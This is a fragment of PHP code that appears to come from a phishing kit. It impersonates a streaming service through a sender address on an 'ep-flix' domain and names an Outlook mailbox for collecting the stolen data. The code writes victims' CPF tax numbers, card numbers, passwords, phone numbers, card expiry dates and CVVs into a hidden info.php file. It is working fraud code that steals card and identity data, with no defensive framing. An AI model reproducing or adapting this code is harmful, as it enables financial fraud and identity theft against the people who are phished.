...
$remetente = 'From: envio@ep-flix.ml';
$destinatario = 'painel3k@outlook.com';
...
$myFilse = "./../doct/ff/ad/info.php";
$fhs = fopen($myFilse, 'a') or die("can't open file");
$msgs="&nbsp&nbsp&nbspCpf:$cpf<br />&nbsp&nbsp&nbspCard:$card<br />&nbsp&nbsp&nbspSenha:$senha<br />&nbsp&nbsp&nbspNumero:$phone <br /> &nbsp&nbsp&nbspValidade:$validade  <br /> &nbsp&nbsp&nbspCvv:$cvv <br /><hr><br />
";
$opens = fopen("../doct/ff/ad/info.php","a+");
$quebras = chr(13).chr(10);//essa é a quebra de linha
fwrite($opens, $msgs);
fclose($opens);
